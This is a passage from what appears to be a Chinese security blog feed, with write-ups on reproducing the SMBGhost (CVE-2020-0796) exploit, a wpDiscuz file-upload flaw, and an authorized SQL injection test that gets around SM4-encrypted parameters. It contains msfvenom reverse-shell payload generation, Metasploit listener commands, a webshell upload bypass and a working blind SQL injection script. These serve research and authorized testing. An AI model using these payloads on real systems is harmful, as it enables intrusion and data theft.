class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91getshell.jpg" alt="正向getshell"></p><ol start="2"><li><p>msf反向反弹Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.23 LPORT=80 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5payload.png" alt="生成payload1"></p><p>​        b. 修改SMBGhost_RCE_PoC中USER_PAYLOAD变量</p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">80</span></span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.23</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91getshell.jpg" alt="反向getshell"></p><h3 id="0x04-小坑和总结"><a href="#0x04-小坑和总结" class="headerlink" title="0x04 小坑和总结"></a>0x04 小坑和总结</h3><ol><li>可以根据实际情况生成payload，即实际网络环境来决定正向还是反向，大多数内网环境由于NAT转换和边界防火墙导致不能直接访问内网的服务，还是建议用反向的将目标权限反弹出来。</li><li>测试的时候目标机器在另一台物理机，本来想远程上去，一起截图证明一下，后台发现，远程的时候，发送反向的payload会导致蓝屏，具体原因没分析。</li><li>测试了Cobalt Strike生成的payload，一打就蓝屏，原因不知道，但是还是希望能用cs搞，cs还是好用些。</li></ol>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress评论插件wpDiscuz任意文件上传漏洞分析</title>
      <link href="/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​&nbsp;&nbsp;在t00ls上看到某wordpress站点被上传webshell，下载了access日志分析了一下，判断攻击路径：访问了某页面后 -&gt; 访问了/wp-admin/admin-ajax.php?action=wmuUploadFiles接口 -&gt; 访问webshell，因此确定是这个模块有问题；官网显示V7.0.5修复了一次安全漏洞，于是下载V7.0.3版本学习一下（7.0.4没找到）。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt="1"></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>php 5.6.40</li><li>mysql 5.7.26</li><li>Phpstorm</li><li>Wordpress 5.4.1 + wpdiscuz V 7.0.3</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li>环境搭建后，手动安装wpdiscuz插件后，看到文章下增加评论模块</li></ol><img src="/img/wordpress评论插件wpDiscuz任意文件上传漏洞分析/2.png" alt="16" style="zoom: 33%;" /><ol start="2"><li>phpstorm导入web目录，点击图片按钮，上传一个php文件测试一下，上传路径是<a href="http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php%EF%BC%8C%E9%BB%98%E8%AE%A4%E6%98%AF%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E7%9A%84%E3%80%82">http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php，默认是上传不了的。</a></li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt="3"></p><ol start="3"><li>从入口点分析，如图是wp_filter的action过滤</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt="4"></p><ol start="4"><li>跟进去，可以看到上传的功能点，再进去</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="5"></p><ol start="5"><li>可以看到如图位置，使用getMimeType方法根据文件内容获取文件类型，并不是通过文件后缀名判断，进一步根据$mineType判断是否是允许的上传类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt="6"></p><ol start="6"><li>跟入查看isAllowedFileType方法，在判斷$mineType是否在$this -&gt; options -&gt; content[“wmuMimeTypes”]中存在。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt="7"></p><ol start="7"><li>如图，进入$options中，可以content[“wmuMimeTypes”]使用三目运算判断，搜索上下文得知，结果就是$defaultOptions[self::TAB_CONTENT][“wmuMimeTypes”]</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt="8"></p><ol start="8"><li>进入$defaultOptions中可以得到最终$this -&gt; options -&gt; content[“wmuMimeTypes”]的值是几种常见的图片类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt="9"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="10"></p><ol start="9"><li>很明显此时文件类型已经通过getMimeType()方法修改为text/plain了，但是回到进入isAllowedFileType的代码，发现程序只在此处对上传文件进行了判断后，直接保存了文件。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="11"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如此，程序只是根据文件内容判断文件类型，并未对文件后缀进行效验，构造一个图片马，或者手动在webshell前面加上图片头信息即可绕过。</p><ol><li>把后门文件追加到图片后</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="13"></p><ol start="2"><li>上传并修改后缀名为php，可以看到返回路径</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="14"></p><ol start="3"><li>连接webshell</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="15"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>​        在装上wpdiscuz插件后，每个文章中都会带有如下标签信息，且带有版本号，可利用此特征编写脚本。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="16"></p><h3 id="check-version-demo"><a href="#check-version-demo" class="headerlink" title="check version demo"></a>check version demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wpdiscuz</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.s.headrs = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.nonce = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        res = self.s.get(url=url)</span><br><span class="line"></span><br><span class="line">        pat1 = <span class="string">&quot;wpdiscuz/themes/default/style\.css\?ver=(.*?)&#x27;&quot;</span></span><br><span class="line">        reSearch1 = re.search(pat1, res.text)</span><br><span class="line">        <span class="keyword">if</span> reSearch1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mess = reSearch1.group(<span class="number">0</span>)</span><br><span class="line">        version = reSearch1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 判断版本</span></span><br><span class="line">        vers = version.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(vers) == <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">0</span>]) == <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">2</span>]) &lt;= <span class="number">4</span>:</span><br><span class="line">                    <span class="built_in">print</span>(url + <span class="string">&quot; 存在任意文件上传漏洞 wpdiscuz版本为 %s&quot;</span> % version)</span><br><span class="line">                    self.state = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># nonce</span></span><br><span class="line">            pat2 = <span class="string">&#x27;&quot;wmuSecurity&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">            reSearch2 = re.search(pat2, res.text)</span><br><span class="line">            nonce = reSearch2.group(<span class="number">1</span>)</span><br><span class="line">            self.nonce = nonce</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url)    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self, url, project, filepath</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    wpdiscuz = wpdiscuz()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;检测漏洞结果:&quot;</span>)</span><br><span class="line">    wpdiscuz.check(url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次sm4前端参数加密下的sql盲注</title>
      <link href="/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><hr><p>&emsp;&emsp;在一次授权渗透测试中，应用在前端使用sql语句拼接方式传送参数，很明显存在sql注入，提交漏洞后，用户大概不想重构项目，于是将前端参数传输前均进行加密，但是通过JS找到加密密钥后，结合py脚本还是注入了；后续用户再次升级将设计加密的JS也加密混淆了，不过还有办法找到密钥，借此分享，过程中踩坑绕弯，欢迎大表哥们交流指导。</p><h3 id="0x01-第一次常规测试"><a href="#0x01-第一次常规测试" class="headerlink" title="0x01 第一次常规测试"></a>0x01 第一次常规测试</h3><ol><li><p>如下图点击功能抓数据包，可以发现参数中明显有SQL语句，后使用1=1 和 1=2 确定了注入点，但是没有返回值，只能盲注了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png" alt="00-第一次常规测试"></p></li><li><p>py写个脚本，简单爆破了一下数据库长度、数据库名等信息<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png" alt="01-第一次脚本盲注"></p></li></ol><h3 id="0x02-第二次参数使用SM4加密"><a href="#0x02-第二次参数使用SM4加密" class="headerlink" title="0x02 第二次参数使用SM4加密"></a>0x02 第二次参数使用SM4加密</h3><ol><li><p>接到复测通知，看了下系统，发现参数被加密了，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png" alt="02-第二次参数加密"></p></li><li><p>这里找加密方法的图没截，大概就是找到对应的ajax方法，可以看到md5_bean参数的生成通过base.js的encryptData_ECB方法生成，打开base.js清晰可见sm4字样以及secretkey和iv，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png" alt="03-找到加密算法"></p></li><li><p>接下来是如何注入，本来想构造一个sqlmap的tamper脚本，但是发现这个是把所有参数一起加密了，没得思路了，于是还是用py写盲注脚本吧，但是网上找的python实现sm4加密的结果都不一样，考虑到这个后台是java的，肯定是java做的解密，于是找了java的sm4实现，试了一下，结果可以了，于是尝试用py调用打包好的jar包进行注入（这里绕了一个大圈，实际上使用py调用js就行，第三次测试的时候更新了）</p></li></ol><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png" alt="04-javasm4加密解密"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> json</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">   </span><br><span class="line">   header = &#123;</span><br><span class="line">       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   pay = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._!@#$%^&amp;*()&#x27;</span></span><br><span class="line">   </span><br><span class="line">   proxies = &#123;</span><br><span class="line">       <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">#request构造请求，传入data中的_searchWhere</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">payload</span>):</span></span><br><span class="line">       url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">       data = <span class="string">&quot;&#123;\&quot;_searchWhere\&quot;:\&quot; %s\&quot;,\&quot;title\&quot;:\&quot;\&quot;,\&quot;paramsFlag\&quot;:\&quot;false\&quot;,\&quot;parVar\&quot;:\&quot;\&quot;,\&quot;frameId\&quot;:\&quot;=\&quot;,\&quot;readOnly\&quot;:\&quot;\&quot;,\&quot;extWhere\&quot;:\&quot;\,\&quot;type\&quot;:\&quot;\&quot;,\&quot;parWhere\&quot;:\&quot;\&quot;,\&quot;dataFlag\&quot;:\&quot;\&quot;&#125;&quot;</span> % payload</span><br><span class="line">       data = quote(data,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">       command = <span class="string">&quot;java -Dmoudle=e -Dstr=%s -jar sm4Decode.jar&quot;</span> % data</span><br><span class="line">       data_sm4 = <span class="string">&quot;&quot;</span>.join(os.popen(command).readlines())</span><br><span class="line">       data_send = &#123;<span class="string">&quot;md5_bean&quot;</span>:data_sm4&#125;</span><br><span class="line">       cookies = &#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">       result = requests.post(url=url, data=data_send, cookies=cookies, headers=header ,proxies=proxies)</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">len</span>(result.text)</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       <span class="comment"># 判断数据库</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">           payload = <span class="string">&quot;and (select length(name) from v$database)=%s&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">           <span class="built_in">print</span>(payload)</span><br><span class="line">           lenstr = attack(payload)</span><br><span class="line">           <span class="keyword">if</span> lenstr &gt; <span class="number">3000</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&quot;数据库长度是%s&quot;</span>% <span class="built_in">str</span>(i))</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br></pre></td></tr></table></figure><p>4.此时客户疑问，这个sql注入1=1 1=2返回结果是不同、暴露一个数据库版本等信息又有什么用，于是多注了一点信息，证明危害，获取用户表名的过程比较啰嗦，这里只有是结果图。<br>a. 用户表数据<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png" alt="05-盲注获取用户表"></p><p>b. owner表数量</p><img src="/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png" alt="06-盲注获取owner表数量" style="zoom:33%;" /><h3 id="0x03-第三次JS加密混淆隐藏密钥"><a href="#0x03-第三次JS加密混淆隐藏密钥" class="headerlink" title="0x03 第三次JS加密混淆隐藏密钥"></a>0x03 第三次JS加密混淆隐藏密钥</h3><ol><li><p>最后一次复测，用户表示已经没问题了，让再看一下，由于时间有点长，重新找一下加密算法位置</p><p>使用抓包抓到的URL，在chrome调试工具中search一下位置，打下断点，点击功能看一下是否触发断点。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png" alt="07-第三次抓包"><br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png" alt="08-调试找到url请求位置"></p></li><li><p>接下来一步一步跟下去，找到参数构造md5_bean参数的位置<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png" alt="09-调试找到参数构造"></p></li><li><p>next找到base64.js，发现代码已经压缩而且加密了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>遇到JS加密了如果有实力的大佬可以解密js或者 <a href="https://www.sojson.com/jsobfuscator.html">https://www.sojson.com/jsobfuscator.html</a> 付费解密，不过只是想得到密钥和iv的话，可以在断点进入base64.js后，调试窗口肯定会显示密钥和iv值，因为不管怎么混淆，代码还是要被正常执行的。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>接下来又是注入了，之前用的脚本思路太麻烦了，这次简单点，直接调SM4加密的js，由于这段js已经混淆了，于是从网上找来base64.js的源码简单改了一下，使用python的execjs调用加密。</p></li></ol><p>a. java解开加密内容如图</p><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png" alt="12-对比明文密文"></p><p>b. python调用js加密明文内容，对比结果（调用js的代码如图，上面没有了，因此没有粘过来，感觉内容有点啰嗦了）<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png" alt="13-py调用js实现SM4"></p><p>6.如此便不用java介入了，之后的操作就是利用之前的盲注脚本，修改一下data参数的加密获取就行了，重复的盲注过程。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol><li>实际上现在得web框架中很少这种前端传js的了，但是在很多老企业中还是有部分网站不想重构，这样的例子有很多，第一次开发说出这种修复sql注入的方法时，还很犹豫的回答，还可以注入吧。。。，没想到真的有人这样修复，随着一次一次的治标不治本，自己也在不断探索学习。</li><li>有的时候感觉除非大厂，很多网站如果一抓包看到把参数一起加密了，很有可能是在想隐藏什么漏洞。。。</li><li>还有一个小坑，加密js在JavaScript中需要手动new一个对象，再用py调用对象+方法。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 加密解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意用户登录漏洞分析</title>
